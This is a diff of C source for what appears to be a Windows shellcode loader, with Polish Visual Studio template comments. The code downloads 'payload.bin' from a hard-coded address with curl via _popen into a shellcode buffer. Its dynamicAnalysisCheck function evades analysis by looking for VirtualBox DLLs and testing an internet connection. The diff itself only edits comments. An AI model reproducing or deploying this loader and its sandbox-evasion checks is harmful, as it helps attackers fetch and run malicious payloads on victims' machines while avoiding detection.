@@ -20,9 +20,9 @@ bool dynamicAnalysisCheck();
 int main()
 {
     FILE* fpipe;
-    const char* command = "curl http://192.168.0.32:8000/payload.bin";
+    const char* command = "curl http://192.168.0.32:8000/payload.bin"; //set your addres
     char c = 0;
-    char shellcode[510]; //set real payload size
+    char shellcode[510]; //set real payload size 
     int counter = 0;
     if (0 == (fpipe = (FILE*)_popen(command, "r"))) {
         perror("popen() failed.\n");
@@ -140,9 +140,7 @@ bool dynamicAnalysisCheck() {
     WIN32_FIND_DATAW findFileData;
     if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;
 
-    // check registry key
-
-    // check internet connection
+    // check internet connection (server response should be 1337 change it if you want)
     HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
     HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
@@ -160,7 +158,6 @@ bool dynamicAnalysisCheck() {
 
 // Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
 // Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie
-
 // Porady dotyczące rozpoczynania pracy:
 //   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
 //   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
